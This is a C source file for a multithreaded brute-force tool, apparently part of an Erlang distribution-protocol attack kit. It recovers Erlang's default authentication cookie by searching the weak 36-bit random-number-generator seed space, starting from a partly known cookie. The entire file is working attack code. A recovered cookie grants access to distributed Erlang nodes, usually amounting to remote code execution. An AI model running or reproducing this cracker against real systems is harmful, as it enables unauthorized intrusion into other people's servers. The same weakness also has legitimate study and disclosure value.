#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pthread.h>
#include <inttypes.h>
#include <string.h>
#include <assert.h>

#include "erldp.h"

static uint64_t next_random(uint64_t x);
static pthread_mutex_t output_lock;

int test_seed(uint64_t seed, const char *cookie, size_t size,
  char *derived) {
  uint64_t x;
  int i;

  x = seed;

  for (i = size-1; i >= 0; i--) {
    derived[i] = 'A' + ((26*x) / 0x1000000000);
    if (cookie[i] != '.' && cookie[i] != derived[i]) {
      return size - i;
    }
    x = next_random(x);
  }

  return 0;
}

static uint64_t next_random(uint64_t x) {
  unsigned __int128 z = x;
  z = (z * 17059465ULL + 1) & 0xfffffffff;
  return (uint64_t) z;
}

struct interval {
  uint64_t start;
  uint64_t end;
  char c;
};

static const struct interval intervals[26] = {
  {0ULL, 2643056797ULL, 'A'},
  {2643056798ULL, 5286113595ULL, 'B'},
  {5286113596ULL, 7929170392ULL, 'C'},
  {7929170393ULL, 10572227190ULL, 'D'},
  {10572227191ULL, 13215283987ULL, 'E'},
  {13215283988ULL, 15858340785ULL, 'F'},
  {15858340786ULL, 18501397582ULL, 'G'},
  {18501397583ULL, 21144454380ULL, 'H'},
  {21144454381ULL, 23787511177ULL, 'I'},
  {23787511178ULL, 26430567975ULL, 'J'},
  {26430567976ULL, 29073624772ULL, 'K'},
  {29073624773ULL, 31716681570ULL, 'L'},
  {31716681571ULL, 34359738367ULL, 'M'},
  {34359738368ULL, 37002795165ULL, 'N'},
  {37002795166ULL, 39645851963ULL, 'O'},
  {39645851964ULL, 42288908760ULL, 'P'},
  {42288908761ULL, 44931965558ULL, 'Q'},
  {44931965559ULL, 47575022355ULL, 'R'},
  {47575022356ULL, 50218079153ULL, 'S'},
  {50218079154ULL, 52861135950ULL, 'T'},
  {52861135951ULL, 55504192748ULL, 'U'},
  {55504192749ULL, 58147249545ULL, 'V'},
  {58147249546ULL, 60790306343ULL, 'W'},
  {60790306344ULL, 63433363140ULL, 'X'},
  {63433363141ULL, 66076419938ULL, 'Y'},
  {66076419939ULL, 68719476735ULL, 'Z'}
};

volatile int quit = 0;
volatile uint64_t seed0 = 0;

struct worker {
  pthread_t tid;
  uint64_t start;
  uint64_t end;
  uint64_t incr;
  const char *cookie;
};

static void *run(void *arg) {
  struct worker *w = arg;
  uint64_t seed;
  int ret;
  char derived[20+1];

  derived[20] = 0;
  for (seed = w->start; seed <= w->end && !quit; seed += w->incr) {
    if (test_seed(seed, w->cookie, 20, derived) == 0) {
      ret = pthread_mutex_lock(&output_lock);
      assert(ret == 0);

      printf("%s (seed = %lld)\n", derived, seed);

      ret = pthread_mutex_unlock(&output_lock);
      assert(ret == 0);
    }
  }

  return NULL;
}


int main(int argc, char **argv) {
  const char *cookie;
  int n_workers = 8;
  struct worker *workers;
  int c;
  int i;
  int ret;

  if (argc != 2) {
    fprintf(stderr, "usage: %s <20 capital letters cookie>\n", argv[0]);
    exit(1);
  }

  cookie = argv[1];
  if (strlen(cookie) != 20) {
    fprintf(stderr, "cookie must be 20 characters long\n");
    exit(1);
  }

  for (i = 0 ; i < 20; i++) {
    if ((cookie[i] < 'A' || cookie[i] > 'Z') && cookie[i] != '.') {
      fprintf(stderr, "cookie must composed of uppercase letters only\n");
      exit(1);
    }
  }

  if (cookie[19] == '.') {
    fprintf(stderr, "sorry cannot do first trial guessing for the time being\n");
    exit(1);
  }


  c = cookie[19] - 'A';

  ret = pthread_mutex_init(&output_lock, NULL);
  assert(ret == 0);

  workers = calloc(sizeof(*workers), n_workers);
  assert(workers);

  for (i = 0; i < n_workers; i++) {
    workers[i].start = intervals[c].start + i;
    workers[i].end = intervals[c].end;
    workers[i].incr = n_workers;
    workers[i].cookie = cookie;

    ret = pthread_create(&workers[i].tid, NULL, run, &workers[i]);
    assert(ret == 0);
  }

  for (i = 0; i < n_workers; i++) {
    pthread_join(workers[i].tid, NULL);
  }

  return 0;
}

